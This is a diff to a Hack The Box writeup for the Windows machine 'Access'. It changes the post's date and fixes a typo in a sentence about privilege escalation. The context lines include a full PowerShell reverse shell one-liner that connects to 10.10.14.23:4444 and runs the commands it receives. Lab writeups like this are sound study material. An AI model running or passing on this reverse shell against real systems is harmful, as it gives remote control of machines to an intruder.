@@ -2,7 +2,7 @@
 layout: single
 title: Access - Hack The Box
 excerpt: This is the writeup for Access, a Windows machine involving some enumeration of an Access DB, an Outlook PST and a priv esc using Windows Credential Manager.
-date: 2019-02-23
+date: 2019-03-02
 classes: wide
 header:
   teaser: /assets/images/htb-writeup-access/access_logo.png
@@ -223,7 +223,7 @@ ff1f3b<redacted>
 
 ### Priv esc with Windows Credentials Manager
 
-Our `security` user doesn't have any useful privileges or group memberships. That telnet shell was pretty slow and buggy. I tried running PowerShell but I wasn't getting any output from the shell so instead of spawned a reverse shell with Nishang:
+Our `security` user doesn't have any useful privileges or group memberships. That telnet shell was pretty slow and buggy. I tried running PowerShell but I wasn't getting any output from the shell so instead I just spawned a reverse shell with Nishang:
 
 ```
 C:\Users\security>powershell -command "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.23',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
